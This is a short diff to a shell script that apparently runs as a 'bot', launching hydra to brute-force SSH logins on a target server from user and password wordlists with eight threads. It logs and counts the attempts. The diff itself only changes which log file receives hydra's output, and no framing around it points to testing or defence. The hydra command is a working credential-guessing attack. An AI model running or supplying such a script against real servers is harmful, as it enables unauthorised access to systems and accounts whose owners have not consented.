@@ -17,6 +17,6 @@ echo "LOGFILE:" $log_file
 echo "[STARTING BOT-ID: $name $(date +%D-%T) ]" | tee -a $log_file
 
 #sleep 1
-
-hydra -L /users -V -P /passwords -t 8 $server ssh | tee -a $name.log && \
+#name.log
+hydra -L /users -V -P /passwords -t 8 $server ssh | tee -a $log_file && \
 echo 'ATTEMPTS:' $( grep ATTEMPT ${name}.log |wc -l) | tee -a $log_file && echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file
